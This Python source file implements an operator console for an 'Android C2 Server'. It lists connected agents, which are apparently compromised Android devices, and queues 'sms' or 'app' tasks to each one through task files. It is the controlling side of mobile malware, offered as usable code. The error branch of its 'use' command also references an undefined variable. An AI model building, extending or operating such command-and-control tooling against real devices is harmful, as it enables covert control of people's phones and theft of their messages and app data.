from cmd import Cmd
import shutil
import os
import main

commands = ["sms", "app"]

class Terminal(Cmd):
    intro = "Android C2 Server\nType help or ? to list commands\n"
    prompt = '(main) > '

    #################
    # Commands here #
    #################

    # To add commands add do_<command name>

    def do_list(self, arg):
        "Lists current active agents"
        self.list_agents()
    
    def do_use(self, number):
        "Interacts with the given agent"
        try:
            number = int(number)
        except:
            print("That's not a number")
            return

        if (number <= len(main.active_agents)):
            # Call agent commandline
            agent = main.active_agents[number-1]
            print(f"[+] Interacting with {agent}")
            main.interacted_agent = agent
            agentInteraction = Agent_Terminal()
            agentInteraction.prompt = f"({agent})> "
            agentInteraction.cmdloop()
        else:
            print(f"[-] Unable to find agent: {agent}")


    def do_exit(self, arg):
        "Exits the prompt"
        print("[+] Exiting...")
        return True
        
    ####################
    # Helper functions #
    ####################

    def list_agents(self):
        total_agents = len(main.active_agents)
        if (total_agents > 0):
            print(f"[+] Number of agents: {total_agents}")
            for i, agent in enumerate(main.active_agents):
                print(f"{i+1}: {agent}")
        else:
            print("[-] No active agents")

class Agent_Terminal(Cmd):
    def do_task(self, args):
        print(f"Agent task: {main.agent_command.get(main.interacted_agent, '')}")

    # Agent commands here
    def do_do(self, args):
        if args in commands:
            with open(f"task/{main.interacted_agent}", "w") as f:
                f.write(args)
        else:
            print("[-] Invalid command")
        

    def do_exit(self, arg):
        "Exits the prompt"
        return True

if __name__ == "__main__":
    terminal = Terminal()
    terminal.cmdloop()